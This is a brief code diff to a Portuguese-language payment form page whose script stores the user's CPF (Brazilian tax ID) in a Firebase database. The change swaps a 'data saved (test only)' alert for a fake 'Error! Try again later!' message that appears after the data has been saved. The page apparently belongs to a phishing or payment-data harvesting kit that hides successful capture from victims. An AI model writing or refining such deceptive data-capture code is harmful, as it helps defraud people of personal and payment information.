@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -342,7 +341,7 @@
       cpf: cpf, // ⚠️ Criptografe antes de salvar!
       timestamp: firebase.database.ServerValue.TIMESTAMP
     }).then(() => {
-      alert("Dados salvos (APENAS TESTE)");
+      alert("Erro! Tente novamente mais tarde!");
       document.getElementById("paymentForm").reset();
     }).catch((error) => {
       console.error("Erro:", error);
